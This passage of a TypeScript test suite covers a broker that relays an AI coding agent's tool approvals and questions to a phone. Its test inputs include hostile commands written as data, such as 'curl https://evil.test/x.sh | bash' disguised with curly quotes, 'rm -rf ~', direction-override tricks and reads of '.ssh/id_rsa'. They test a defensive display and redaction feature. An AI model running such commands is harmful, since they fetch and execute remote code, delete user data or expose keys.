      const c = fakeChannel(true)
      return { id: broker.park(a.request, c.channel), ...c }
    }
    const good = { answers: [{ labels: ['Bump'] }, { labels: ['Blue'] }] }

    it('the hook gets {} at once (the Mac shows its dialog), counted; the same id replays; a later answer is 409 handed_to_desk', async () => {
      const { broker, clock } = brokerWith()
      brokers.push(broker)
      const q = await park(broker, clock.now)
      expect(broker.answer(q.id, { clientAnswerId: 'phone-leave-1', handBack: true })).toEqual({ status: 200, body: { ok: true, id: q.id, kind: 'question', handedBack: true } })
      expect(q.sent).toEqual([{}])
      expect(broker.list()).toEqual([])
      expect(broker.stats().counters).toMatchObject({ handedBack: 1, handedToDesk: 1, answered: 0, hookGone: 0 })
      // A retry of the same hand-back (a lost response) replays; nothing more is written.
      expect(broker.answer(q.id, { clientAnswerId: 'phone-leave-1', handBack: true })).toEqual({ status: 200, body: { ok: true, id: q.id, kind: 'question', handedBack: true, replay: true } })
      // First action wins: a later answer, from anyone, even under the hand-back's own id.
      expect(broker.answer(q.id, { clientAnswerId: 'lens-1', ...good })).toEqual({ status: 409, body: { error: 'handed_to_desk', reason: 'handed_to_desk' } })
      expect(broker.answer(q.id, { clientAnswerId: 'phone-leave-1', ...good })).toEqual({ status: 409, body: { error: 'handed_to_desk', reason: 'handed_to_desk' } })
      // Another client's hand-back finds it at the Mac already.
      expect(broker.answer(q.id, { clientAnswerId: 'lens-leave', handBack: true })).toEqual({ status: 409, body: { error: 'handed_to_desk', reason: 'handed_to_desk' } })
      expect(q.sent).toEqual([{}])
      expect(broker.stats().counters).toMatchObject({ handedBack: 1, handedToDesk: 1, answered: 0 })
      // An approval hands back the same way.
      const a = await park(broker, clock.now, 'Bash', { command: 'git push' })
      expect(broker.answer(a.id, { clientAnswerId: 'lens-leave-2', handBack: true })).toEqual({ status: 200, body: { ok: true, id: a.id, kind: 'approval', handedBack: true } })
      expect(a.sent).toEqual([{}])
      expect(broker.answer(a.id, { clientAnswerId: 'x', decision: 'allow' })).toEqual({ status: 409, body: { error: 'handed_to_desk', reason: 'handed_to_desk' } })
    })

    it('after an answer, a hand-back is 409 already_answered with the recorded answer, even under the answer\'s own id', async () => {
      const { broker, clock } = brokerWith()
      brokers.push(broker)
      const a = await park(broker, clock.now, 'Bash', { command: 'git push' })
      expect(broker.answer(a.id, { clientAnswerId: 'lens-1', decision: 'allow' }).status).toBe(200)
      expect(broker.answer(a.id, { clientAnswerId: 'phone-leave', handBack: true })).toEqual({ status: 409, body: { error: 'already_answered', decision: 'allow' } })
      expect(broker.answer(a.id, { clientAnswerId: 'lens-1', handBack: true })).toEqual({ status: 409, body: { error: 'already_answered', decision: 'allow' } })
      // The answer's own retry still replays it.
      expect(broker.answer(a.id, { clientAnswerId: 'lens-1', decision: 'allow' })).toEqual({ status: 200, body: { ok: true, id: a.id, kind: 'approval', replay: true, decision: 'allow' } })
      expect(a.sent).toEqual([approvalHookOutput('allow')])
      const q = await park(broker, clock.now)
      expect(broker.answer(q.id, { clientAnswerId: 'lens-2', ...good }).status).toBe(200)
      expect(broker.answer(q.id, { clientAnswerId: 'phone-leave', handBack: true })).toEqual({ status: 409, body: { error: 'already_answered', answers: { [Q1]: ['Bump'], [Q2]: ['Blue'] } } })
      expect(broker.stats().counters).toMatchObject({ handedBack: 0, handedToDesk: 0, answered: 2 })
    })

    it('into a hook that already left it is 410 hook_gone, nothing is written, and it is not a hand-back', async () => {
      const { broker, clock } = brokerWith()
      brokers.push(broker)
      const q = await park(broker, clock.now)
      q.channel.open = false
      expect(broker.answer(q.id, { clientAnswerId: 'leave', handBack: true })).toEqual({ status: 410, body: { error: 'hook_gone' } })
      expect(q.sent).toEqual([])
      expect(broker.stats().counters).toMatchObject({ handedBack: 0, handedToDesk: 0, hookGone: 1 })
      // Past the deadline it is expired, like an answer.
      const late = await park(broker, clock.now)
      clock.now += 111_000
      expect(broker.answer(late.id, { clientAnswerId: 'leave', handBack: true })).toEqual({ status: 409, body: { error: 'expired' } })
      expect(broker.stats().counters).toMatchObject({ handedBack: 0, expired: 1 })
    })

    it('handBack: true wins over answer fields in the same body; any other value is not a hand-back', async () => {
      const { broker, clock } = brokerWith()
      brokers.push(broker)
      const a = await park(broker, clock.now, 'Bash', { command: 'rm -rf build' })
      expect(broker.answer(a.id, { clientAnswerId: 'both', handBack: true, decision: 'allow' })).toEqual({ status: 200, body: { ok: true, id: a.id, kind: 'approval', handedBack: true } })
      expect(a.sent).toEqual([{}])
      const b = await park(broker, clock.now, 'Bash', { command: 'rm -rf dist' })
      for (const handBack of ['true', 1, false, null]) {
        expect(broker.answer(b.id, { clientAnswerId: 'odd', handBack }), String(handBack)).toEqual({ status: 400, body: { error: 'invalid_answer', reason: 'decision' } })
      }
      expect(b.sent).toEqual([])
      // An id is still required.
      expect(broker.answer(b.id, { handBack: true })).toEqual({ status: 400, body: { error: 'invalid_answer', reason: 'client_answer_id' } })
      expect(broker.pendingCount()).toBe(1)
    })
  })

  it('every gate is counted by why, and the cheap ones never read the desk', async () => {
    const { broker, s, clock } = brokerWith()
    brokers.push(broker)
    s.mode = 'off'
    expect(await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).toEqual({ ok: false, reason: 'broker_off' })
    s.mode = 'all'
    s.admissions = false
    expect(await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).toEqual({ ok: false, reason: 'draining' })
    s.admissions = true
    expect((await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, { cursor_version: '3.21' }, clock.now)))).toEqual({ ok: false, reason: 'cursor' })
    s.mode = 'questions'
    expect(await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).toEqual({ ok: false, reason: 'approvals_off' })
    s.mode = 'all'
    expect(await broker.admit(permissionEnvelope('ExitPlanMode', { plan: 'x' }, {}, clock.now))).toEqual({ ok: false, reason: 'unsupported_tool' })
    s.seenAt = null
    expect(await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).toEqual({ ok: false, reason: 'no_client' })
    // Unparseable questions are only looked at once every cheap gate passed.
    expect(await broker.admit(permissionEnvelope('AskUserQuestion', { questions: [] }, {}, clock.now))).toEqual({ ok: false, reason: 'no_client' })
    s.seenAt = clock.now - CLIENT_LIVE_WINDOW_MS - 1
    expect(await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).toEqual({ ok: false, reason: 'no_client' })
    s.seenAt = clock.now - CLIENT_LIVE_WINDOW_MS
    // A hook that started a deadline ago is about to give up: nothing to hold.
    expect(await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now - 110_000))).toEqual({ ok: false, reason: 'stale_hook' })
    expect(s.idleReads).toBe(0)
    s.idle = null
    expect(await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).toEqual({ ok: false, reason: 'desk_unknown' })
    s.idle = 89
    expect(await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).toEqual({ ok: false, reason: 'desk_active' })
    s.idle = 90
    expect(await broker.admit(permissionEnvelope('AskUserQuestion', { questions: [] }, {}, clock.now))).toEqual({ ok: false, reason: 'unsupported_input' })
    expect((await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).ok).toBe(true)
    expect(broker.health().counters.fastPath).toEqual({ brokerOff: 1, draining: 1, cursor: 1, approvalsOff: 1, unsupportedTool: 1, noClient: 3, staleHook: 1, deskUnknown: 1, deskActive: 1, unsupportedInput: 1 })
    expect(broker.health().counters.parked).toBe(0)
  })

  it('builds nothing from the input before the cheap gates pass: a 900 KB Write with no client is {} fast', async () => {
    const { broker, s, clock } = brokerWith()
    brokers.push(broker)
    s.seenAt = null
    const content = 'const x = 1\n'.repeat(75_000) // ~900 KB
    const started = performance.now()
    expect(await broker.admit(permissionEnvelope('Write', { file_path: '/Users/example/big.ts', content }, {}, clock.now))).toEqual({ ok: false, reason: 'no_client' })
    expect(performance.now() - started).toBeLessThan(20)
    expect(s.idleReads).toBe(0)
  })

  it('reads NOTHING of the tool input before the cheap gates pass: no card, no fingerprint (a counting proxy)', async () => {
    // Deterministic, unlike a timing: the card's own builder is what reads the input, so any
    // read at all on a fast path is a card (or a fingerprint) built for nothing. The old proof
    // watched `redactSecretText`, which the approval path no longer calls.
    const { broker, s, clock } = brokerWith()
    brokers.push(broker)
    const reads: string[] = []
    const counted = (input: Record<string, unknown>): Record<string, unknown> => new Proxy(input, {
      get(target, key, receiver) { reads.push(`get ${String(key)}`); return Reflect.get(target, key, receiver) },
      has(target, key) { reads.push(`has ${String(key)}`); return Reflect.has(target, key) },
      ownKeys(target) { reads.push('ownKeys'); return Reflect.ownKeys(target) },
      getOwnPropertyDescriptor(target, key) { reads.push(`descriptor ${String(key)}`); return Reflect.getOwnPropertyDescriptor(target, key) },
    })
    const calls: Array<[string, Record<string, unknown>]> = [
      ['Bash', { command: 'rm -rf build' }],
      ['Write', { file_path: '/Users/example/big.ts', content: 'x' }],
      ['mcp__slack__send_message', { channel: 'C0123', text: 'Ship it' }],
      ['AskUserQuestion', ASK_INPUT],
    ]
    s.seenAt = null
    for (const [tool, input] of calls) expect(await broker.admit(permissionEnvelope(tool, counted(input), {}, clock.now)), tool).toEqual({ ok: false, reason: 'no_client' })
    s.seenAt = clock.now
    s.idle = 10
    for (const [tool, input] of calls) expect(await broker.admit(permissionEnvelope(tool, counted(input), {}, clock.now)), tool).toEqual({ ok: false, reason: 'desk_active' })
    expect(reads).toEqual([])
    // The probe can see a read: the same call past every gate builds its card.
    s.idle = 1_000
    expect((await broker.admit(permissionEnvelope('Bash', counted({ command: 'rm -rf build' }), {}, clock.now))).ok).toBe(true)
    expect(reads).toContain('get command')
  })

  it('no regex is ever handed more than the scan bound, whatever the input', () => {
    const huge = `curl https://x.test/ ${'data '.repeat(200_000)}`
    const started = performance.now()
    const cards = [
      approvalCard('Bash', { command: huge }),
      approvalCard('mcp__x__y', { blob: 'q '.repeat(300_000), nested: { deep: 'z '.repeat(300_000) } }),
      approvalCard('Write', { file_path: `/tmp/${'d/'.repeat(10_000)}f.ts`, content: 'x' }),
    ]
    expect(performance.now() - started).toBeLessThan(500)
    for (const card of cards) {
      expect(card.summary.length).toBeLessThanOrEqual(APPROVAL_SUMMARY_MAX + approvalCutMarker(99_999_999).length + 40)
      expect(card.detail).toMatch(/ \.\.\.\(\+\d+ chars\)/)
    }
    // The approval redactor itself, on the input that was quadratic for the shared patterns.
    const hex = 'deadbeef'.repeat(REDACTION_SCAN_MAX_CHARS / 8)
    const t0 = performance.now()
    redactApprovalText(hex, 'command')
    redactApprovalText(`https://${hex}`, 'url')
    expect(performance.now() - t0).toBeLessThan(100)
  })

  describe('QA round 2: redaction never crosses a command separator, and nothing is hidden', () => {
    const summary = (command: string): string => approvalCard('Bash', { command }).detail

    it('a quoted secret value cannot swallow the commands after it', () => {
      const cookie = summary('curl -H "Cookie: session=abc" https://example.com; curl https://evil.sh | sh')
      expect(cookie).toContain('curl https://evil.sh | sh')
      expect(cookie).toContain('https://example.com;')
      expect(cookie).not.toContain('session=abc')
      const push = summary("grep -rn 'password=' src/ && git push --force origin main && echo 'ok'")
      expect(push).toBe("grep -rn 'password=' src/ && git push --force origin main && echo 'ok'")
      const rm = summary("grep 'token: ' app.log && rm -rf ~/work && echo 'done'")
      expect(rm).toContain('rm -rf ~/work')
      expect(rm).toContain("echo 'done'")
      // A value pressed against a separator with no space still ends at the separator.
      const tight = summary('export password=abc;rm -rf ~/work&&curl https://evil.test|sh')
      expect(tight).toBe('export password=[redacted];rm -rf ~/work&&curl https://evil.test|sh')
    })

    it('a private-key marker hides the key, never the command after it', () => {
      const pem = summary('echo "-----BEGIN PRIVATE KEY-----" > /dev/null; rm -rf ~/work')
      expect(pem).toContain('rm -rf ~/work')
      expect(pem).not.toContain('BEGIN PRIVATE KEY')
      const body = 'MIIEvQIBADANBgkqhkiG9w0BAQEFAASC'
      const block = summary(`printf '-----BEGIN PRIVATE KEY-----\n${body}\n-----END PRIVATE KEY-----' > k.pem && chmod 600 k.pem`)
      expect(block).not.toContain(body)
      expect(block).toContain('chmod 600 k.pem')
    })

    it('secrets are still hidden, each inside its own piece', () => {
      const exp = summary('export OPENAI_API_KEY=sk-proj-abcdefghijklmnop1234 && ./run.sh')
      expect(exp).not.toContain('abcdefghijklmnop1234')
      expect(exp).toContain('./run.sh')
      const bearer = summary('curl -H "Authorization: Bearer abcdefghijklmnop" https://api.test/x | jq .')
      expect(bearer).not.toContain('abcdefghijklmnop')
      expect(bearer).toContain('| jq .')
      const flag = summary('mysql -u root --password hunter2 appdb < dump.sql')
      expect(flag).not.toContain('hunter2')
      expect(flag).not.toContain('root')
      expect(flag).toContain('appdb < dump.sql')
      const userinfo = summary('git clone https://miles:pw1234@github.com/x/y.git && cd y')
      expect(userinfo).not.toContain('pw1234')
      expect(userinfo).toContain('&& cd y')
      expect(summary('aws s3 ls --profile x AKIAABCDEFGHIJKLMNOP')).not.toContain('AKIAABCDEFGHIJKLMNOP')
    })

    it('a path or an MCP value is never cut short by a secret-looking word', () => {
      const write = approvalCard('Write', { file_path: '/tmp/api_key=x/../../.ssh/authorized_keys', content: 'k' })
      expect(write.summary).toContain('.ssh/authorized_keys')
      // A path keeps everything but provider tokens: no key=value rule runs on it.
      expect(write.summary).toContain('api_key=x/../../.ssh/authorized_keys')
      // In a command, a secret-looking value stops at a slash, so the path after it shows.
      expect(summary('cat api_key=x/../../.ssh/id_rsa')).toContain('/../../.ssh/id_rsa')
      const mcp = approvalCard('mcp__db__query', { session: "'", sql: 'DROP TABLE users', note: "'" })
      expect(mcp.summary).toContain('DROP TABLE users')
      const fetch = approvalCard('WebFetch', { url: 'https://u:secretpw@host.test/a?token=abc123&page=2', prompt: 'p' })
      expect(fetch.summary).not.toContain('secretpw')
      expect(fetch.summary).not.toContain('abc123')
      expect(fetch.summary).toContain('page=2')
    })

    it('a line break is shown as \\n, never merged into the previous command', () => {
      expect(summary('echo "cleaning up"\nrm -rf ~/Documents')).toBe('echo "cleaning up" \\n rm -rf ~/Documents')
      expect(summary('a\r\nb')).toBe('a \\n b')
    })

    it('direction overrides, zero-width characters and line separators are shown, not obeyed', () => {
      const rlo = String.fromCharCode(0x202e)
      const zws = String.fromCharCode(0x200b)
      const ls = String.fromCharCode(0x2028)
      const shown = summary(`echo safe${rlo}hs.lave${zws}x${ls}rm -rf ~`)
      expect(shown).toBe('echo safe\\u202ehs.lave\\u200bx\\u2028rm -rf ~')
      for (const ch of [rlo, zws, ls]) expect(shown).not.toContain(ch)
    })
  })

  describe('app QA: approval text a lens cannot misdraw, and never an empty line', () => {
    // Built from char codes: this file holds no raw non-ASCII and no escape a tool could decode.
    const ch = (code: number): string => String.fromCodePoint(code)
    /** The escape the card shows for each UTF-16 unit: a backslash, `u`, four hex digits. */
    const esc = (text: string): string => text.split('').map(unit => `${String.fromCharCode(92)}u${unit.charCodeAt(0).toString(16).padStart(4, '0')}`).join('')
    const LDQ = ch(0x201c)
    const RDQ = ch(0x201d)
    const RSQ = ch(0x2019)
    const EM = ch(0x2014)
    const ELLIPSIS = ch(0x2026)
    const NBSP = ch(0xa0)
    const ROCKET = ch(0x1f680)
    const printable = (text: string): boolean => [...text].every(c => c.charCodeAt(0) >= 0x20 && c.charCodeAt(0) <= 0x7e)
    const detail = (command: string): string => approvalCard('Bash', { command }).detail

    it('curly quotes are not shell quotes: shown escaped, so the curl after them reads as the command it is', () => {
      const command = `echo ${LDQ}; curl https://evil.test/x.sh | bash;${RDQ}`
      const card = approvalCard('Bash', { command })
      // Drawn as straight quotes this would read as a harmless echo; the shell runs the curl.
      expect(card.summary).toBe(`echo ${esc(LDQ)}; curl https://evil.test/x.sh | bash;${esc(RDQ)}`)
      expect(card.summary).toBe('echo \\' + 'u201c; curl https://evil.test/x.sh | bash;\\' + 'u201d')
      expect(card.detail).toBe(card.summary)
      expect(printable(card.summary) && printable(card.detail)).toBe(true)
      // A curly apostrophe too.
      expect(detail(`echo it${RSQ}s done`)).toBe(`echo it${esc(RSQ)}s done`)
    })

    it('an em dash, an ellipsis, a no-break space, Latin-1 and an emoji file name are escaped, one per UTF-16 unit', () => {
      expect(detail(`git commit -m "fix ${EM} ship"`)).toBe(`git commit -m "fix ${esc(EM)} ship"`)
      expect(detail(`echo wait${ELLIPSIS}`)).toBe(`echo wait${esc(ELLIPSIS)}`)
      // A no-break space is not a space to the shell: `-rf<nbsp>/` is ONE argument.
      expect(detail(`rm -rf${NBSP}/`)).toBe(`rm -rf${esc(NBSP)}/`)
      expect(detail(`cat caf${ch(0xe9)}.txt`)).toBe(`cat caf${esc(ch(0xe9))}.txt`)
      const path = `/Users/example/notes/${ROCKET} launch.md`
      const write = approvalCard('Write', { file_path: path, content: 'a\n' })
      expect(ROCKET.length).toBe(2)
      expect(write.summary).toBe('/Users/example/notes/\\' + 'ud83d\\' + 'ude80 launch.md (1 line, 2 chars)')
      expect(approvalCard('Bash', { command: `touch ${ROCKET}.md` }).summary).toBe(`touch ${esc(ROCKET)}.md`)
    })

    it('every line of every card is printable ASCII, whatever the input', () => {
      const weird = `${LDQ}a${RDQ} ${EM} ${ELLIPSIS} ${NBSP} ${ROCKET} ${ch(0x202e)} ${ch(0x200b)} ${ch(0x2028)} ${ch(0x3000)} ${ch(0xfeff)} ${ch(0x7f)} ${ch(0x85)} ${ch(0xdc00)}`
      const cards = [
        approvalCard('Bash', { command: weird }),
        approvalCard('Write', { file_path: `/tmp/${weird}`, content: weird }),
        approvalCard('NotebookEdit', { notebook_path: '/tmp/n.ipynb', new_source: 'x', edit_mode: `insert${RDQ}${EM}` }),
        approvalCard('WebFetch', { url: `https://example.test/${weird}`, prompt: weird }),
        approvalCard('WebSearch', { query: weird }),
        approvalCard('mcp__x__y', { text: weird, nested: { deep: weird } }),
      ]
      for (const card of cards) {
        expect(printable(card.summary), card.summary).toBe(true)
        expect(printable(card.detail), card.detail).toBe(true)
      }
      // NotebookEdit's mode is the call's own text: escaped too.
      expect(cards[2]!.summary).toBe(`/tmp/n.ipynb (insert${esc(RDQ)}${esc(EM)}, 1 line)`)
    })

    it('secrets are still hidden next to an escaped character, and escaping stays fast', () => {
      const card = detail(`export API_KEY=sk-proj-abcdefghijklmnop1234${ELLIPSIS} && ./run.sh`)
      expect(card).not.toContain('abcdefghijklmnop1234')
      expect(card).toContain('&& ./run.sh')
      // Six characters out for each one in: the whole scan bound of curly quotes, no spaces.
      const started = performance.now()
      const long = approvalCard('Bash', { command: LDQ.repeat(REDACTION_SCAN_MAX_CHARS) })
      expect(performance.now() - started).toBeLessThan(200)
      expect(long.summary.startsWith(esc(LDQ).repeat(3))).toBe(true)
      expect(long.summary).toMatch(/ \.\.\.\(\+\d+ chars\)$/)
    })

    it('a call with nothing to show still has a line: (empty command), (empty path), (no input)', () => {
      expect(APPROVAL_EMPTY_COMMAND).toBe('(empty command)')
      expect(APPROVAL_EMPTY_PATH).toBe('(empty path)')
      expect(APPROVAL_NO_INPUT).toBe('(no input)')
      const cases: Array<[string, Record<string, unknown>, string]> = [
        ['Bash', {}, '(no input)'],
        ['Bash', { command: '' }, '(empty command)'],
        ['Bash', { command: ' \t  ' }, '(empty command)'],
        ['Bash', { cmd: '' }, '(empty command)'],
        ['mcp__slack__send_message', {}, '(no input)'],
        ['WebFetch', { url: '', prompt: 'p' }, '(no input)'],
        ['WebSearch', { query: '   ' }, '(no input)'],
        ['Write', { file_path: '', content: '' }, '(empty path) (0 lines, 0 chars)'],
        ['Edit', { file_path: '  ', old_string: 'a', new_string: 'b' }, '(empty path) (+1 -1 lines)'],
      ]
      for (const [tool, input, shown] of cases) {
        const card = approvalCard(tool, input)
        expect(card, `${tool} ${JSON.stringify(input)}`).toEqual({ tool, summary: shown, detail: shown })
      }
      // A line break alone is something to show: it is drawn, not dropped.
      expect(approvalCard('Bash', { command: '\n' }).summary).toBe('\\n')
    })

    it('an item held for a call with no input is listed with a line the client can draw', async () => {
      const { broker, clock } = brokerWith()
      brokers.push(broker)
      for (const input of [{}, { command: '' }]) {
        const a = await broker.admit(permissionEnvelope('Bash', input, {}, clock.now))
        if (!a.ok) throw new Error(a.reason)
        broker.park(a.request, fakeChannel(true).channel)
      }
      const shown = broker.list().map(item => item.approval?.summary)
      expect(shown).toEqual(['(no input)', '(empty command)'])
    })
  })

  it('capacity holds after the desk read: requests admitted during it count', async () => {
    const releases: Array<(v: number) => void> = []
    const { broker, clock } = brokerWith({ readDeskIdleSeconds: () => new Promise<number>(r => { releases.push(r) }) })
    brokers.push(broker)
    // MAX_PENDING - 1 already held.
    for (let i = 0; i < MAX_PENDING - 1; i++) {
      const pending = broker.admit(permissionEnvelope('Bash', { command: `echo ${i}` }, {}, clock.now))
      releases.shift()!(1_000)
      const a = await pending
      if (!a.ok) throw new Error(a.reason)
      broker.park(a.request, fakeChannel(true).channel)
    }
    // Two requests pass the first capacity check together, then read the desk.
    const one = broker.admit(permissionEnvelope('Bash', { command: 'echo one' }, {}, clock.now))
    const two = broker.admit(permissionEnvelope('Bash', { command: 'echo two' }, {}, clock.now))
    await new Promise(r => setTimeout(r, 0))
    expect(releases).toHaveLength(2)
    releases.shift()!(1_000)
    const first = await one
    if (!first.ok) throw new Error(first.reason)
    broker.park(first.request, fakeChannel(true).channel)
    releases.shift()!(1_000)
    expect(await two).toEqual({ ok: false, reason: 'capacity' })
    expect(broker.pendingCount()).toBe(MAX_PENDING)
  })

  it('the desk-idle setting never goes below 30 s', async () => {
    const { broker, s, clock } = brokerWith({ deskIdleSeconds: () => 5 })
    brokers.push(broker)
    expect(DESK_IDLE_MIN_S).toBe(30)
    s.idle = 29
    expect(await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).toEqual({ ok: false, reason: 'desk_active' })
    s.idle = 30
    const a = await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))
    if (!a.ok) throw new Error(a.reason)
    const { channel, sent } = fakeChannel(true)
    broker.park(a.request, channel)
    // Held: 20 s idle is below the floor, so it reads as the desk.
    s.idle = 20
    await broker.tick()
    expect(sent).toEqual([{}])
  })

  it('the switch or a drain arriving DURING the desk read still answers {}', async () => {
    let release: (v: number) => void = () => {}
    const { broker, s, clock } = brokerWith({ readDeskIdleSeconds: () => new Promise<number>(r => { release = r }) })
    brokers.push(broker)
    const pending = broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))
    s.mode = 'off'
    release(1_000)
    expect(await pending).toEqual({ ok: false, reason: 'broker_off' })
    s.mode = 'all'
    const second = broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))
    s.admissions = false
    release(1_000)
    expect(await second).toEqual({ ok: false, reason: 'draining' })
    // Approvals turned off during the read: a question would still be held, a tool is not.
    s.admissions = true
    const third = broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))
    s.mode = 'questions'
    release(1_000)
    expect(await third).toEqual({ ok: false, reason: 'approvals_off' })
    const question = broker.admit(permissionEnvelope('AskUserQuestion', ASK_INPUT, {}, clock.now))
    release(1_000)
    expect((await question).ok).toBe(true)
  })

  it('the deadline counts from the hook\'s own start, and a timer settles it', async () => {
    const { broker, clock } = brokerWith({ timeoutMs: () => 110_000 })
    brokers.push(broker)
    const admission = await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now - 4_000))
    if (!admission.ok) throw new Error('not admitted')
    expect(admission.request.deadlineAt).toBe(clock.now - 4_000 + 110_000)
    // A stamp from the future is not trusted: the deadline counts from now.
    const future = await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now + 60_000))
    if (!future.ok) throw new Error('not admitted')
    expect(future.request.deadlineAt).toBe(clock.now + 110_000)
    // A deadline the timer has not reached yet still expires the item on the next read.
    const { channel, sent } = fakeChannel(true)
    const id = broker.park(admission.request, channel)
    clock.now += 106_000
    expect(broker.answer(id, { clientAnswerId: 'late', decision: 'allow' })).toEqual({ status: 409, body: { error: 'expired' } })
    expect(sent).toEqual([{}])
  })

  it('retracts on the session moving on without us, and only then', async () => {
    const { broker, clock } = brokerWith()
    brokers.push(broker)
    const bash = { command: 'touch par-a' }
    const park = async (tool: string, input: Record<string, unknown>) => {
      const a = await broker.admit(permissionEnvelope(tool, input, {}, clock.now))
      if (!a.ok) throw new Error(a.reason)
      const c = fakeChannel(true)
      return { id: broker.park(a.request, c.channel), sent: c.sent }
    }
    const approval = await park('Bash', bash)
    // A parallel auto-allowed tool, another command, a child, or history: none of them.
    broker.observeHookEvent(hookEvent('PostToolUse', clock.now + 1, { tool_name: 'Read', tool_input: { file_path: '/x' } }), false)
    broker.observeHookEvent(hookEvent('PostToolUse', clock.now + 1, { tool_name: 'Bash', tool_input: { command: 'ls' } }), false)
    broker.observeHookEvent(hookEvent('PostToolUse', clock.now + 1, { tool_name: 'Bash', tool_input: bash }), true)
    broker.observeHookEvent(hookEvent('PostToolUse', clock.now - 5, { tool_name: 'Bash', tool_input: bash }), false)
    broker.observeHookEvent(hookEvent('SessionStart', clock.now + 1, { source: 'compact' }), false)
    expect(approval.sent).toEqual([])
    // Its own tool ran: the native dialog was answered at the desk.
    broker.observeHookEvent(hookEvent('PostToolUse', clock.now + 2, { tool_name: 'Bash', tool_input: bash }), false)
    expect(approval.sent).toEqual([{}])
    expect(broker.answer(approval.id, { clientAnswerId: 'x', decision: 'allow' })).toEqual({ status: 409, body: { error: 'handed_to_desk', reason: 'retracted' } })

    const denied = await park('Bash', { command: 'rm -rf build' })
    broker.observeHookEvent(hookEvent('PermissionDenied', clock.now + 3, { tool_name: 'Bash', tool_input: { command: 'rm -rf build ' } }), false)
    expect(denied.sent).toEqual([{}])

    const question = await park('AskUserQuestion', ASK_INPUT)
    broker.observeHookEvent(hookEvent('PostToolUse', clock.now + 4, { tool_name: 'AskUserQuestion', tool_input: { ...ASK_INPUT, answers: { [Q1]: ['Tag'] } } }), false)
    expect(question.sent).toEqual([{}])

    for (const [event, payload] of [['Stop', {}], ['StopFailure', {}], ['SessionEnd', { reason: 'other' }], ['UserPromptSubmit', { prompt: 'x' }], ['SessionStart', { source: 'resume' }]] as const) {
      const held = await park('Bash', { command: `echo ${event}` })
      broker.observeHookEvent(hookEvent(event, clock.now + 5, payload), false)
      expect(held.sent, event).toEqual([{}])
    }
    expect(broker.health().counters.retracted).toBe(8)
    expect(broker.pendingCount()).toBe(0)
  })

  it('desk return and a drain hand every held item back, and a desk unreadable TWICE in a row counts as the desk', async () => {
    const { broker, s, clock } = brokerWith()
    brokers.push(broker)
    const park = async () => {
      const a = await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))
      if (!a.ok) throw new Error(a.reason)
      const c = fakeChannel(true)
      return { id: broker.park(a.request, c.channel), sent: c.sent }
    }
    const one = await park()
    await broker.tick()
    expect(one.sent).toEqual([]) // still away
    s.idle = 3
    await broker.tick()
    expect(one.sent).toEqual([{}])
    s.idle = 1_000
    const two = await park()
    s.admissions = false
    await broker.tick()
    expect(two.sent).toEqual([{}])
    expect(broker.answer(two.id, { clientAnswerId: 'x', decision: 'allow' })).toEqual({ status: 409, body: { error: 'handed_to_desk', reason: 'drained' } })
    s.admissions = true
    const three = await park()
    // One failed read is not the desk: a single ioreg that timed out under load.
    s.idle = null
    await broker.tick()
    expect(three.sent).toEqual([])
    // A good read in between resets the count.
    s.idle = 1_000
    await broker.tick()
    s.idle = null
    await broker.tick()
    expect(three.sent).toEqual([])
    // The second failure IN A ROW hands it back.
    await broker.tick()
    expect(three.sent).toEqual([{}])
    expect(broker.health().counters).toMatchObject({ handedToDesk: 2, drained: 1, deskUnreadable: 3 })
  })

  it('the answering client going quiet hands every held item back (no_client, its own counter)', async () => {
    const { broker, s, clock } = brokerWith()
    brokers.push(broker)
    const a = await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))
    if (!a.ok) throw new Error(a.reason)
    const { channel, sent } = fakeChannel(true)
    const id = broker.park(a.request, channel)
    clock.now += CLIENT_LIVE_WINDOW_MS // exactly the window: still live
    await broker.tick()
    expect(sent).toEqual([])
    clock.now += 1
    await broker.tick()
    expect(sent).toEqual([{}])
    expect(broker.answer(id, { clientAnswerId: 'late', decision: 'allow' })).toEqual({ status: 409, body: { error: 'handed_to_desk', reason: 'no_client' } })
    // A stamp from the future is stale while held, too.
    s.seenAt = clock.now + POLL_FUTURE_SKEW_MS + 1
    const b = await (async () => { s.seenAt = clock.now; return broker.admit(permissionEnvelope('Bash', { command: 'ls -a' }, {}, clock.now)) })()
    if (!b.ok) throw new Error(b.reason)
    const second = fakeChannel(true)
    broker.park(b.request, second.channel)
    s.seenAt = clock.now + POLL_FUTURE_SKEW_MS + 1
    await broker.tick()
    expect(second.sent).toEqual([{}])
    expect(broker.health().counters).toMatchObject({ noClient: 2, handedToDesk: 0 })
  })

  it('a settled item keeps codes and what was chosen, never the questions or the card', async () => {
    const { broker, clock } = brokerWith()
    brokers.push(broker)
    const internals = (id: string) => (broker as unknown as { items: Map<string, { questions: unknown; approval: unknown; toolInput: unknown; answer: unknown }> }).items.get(id)!
    const q = await broker.admit(permissionEnvelope('AskUserQuestion', ASK_INPUT, {}, clock.now))
    if (!q.ok) throw new Error(q.reason)
    const qid = broker.park(q.request, fakeChannel(true).channel)
    expect(internals(qid).questions).not.toBeNull()
    expect(broker.answer(qid, { clientAnswerId: 'c1', answers: [{ labels: ['Bump'] }, { labels: ['Blue'] }] }).status).toBe(200)
    expect(internals(qid)).toMatchObject({ questions: null, approval: null, toolInput: {}, answer: { clientAnswerId: 'c1', chosen: { answers: { [Q1]: ['Bump'], [Q2]: ['Blue'] } } } })
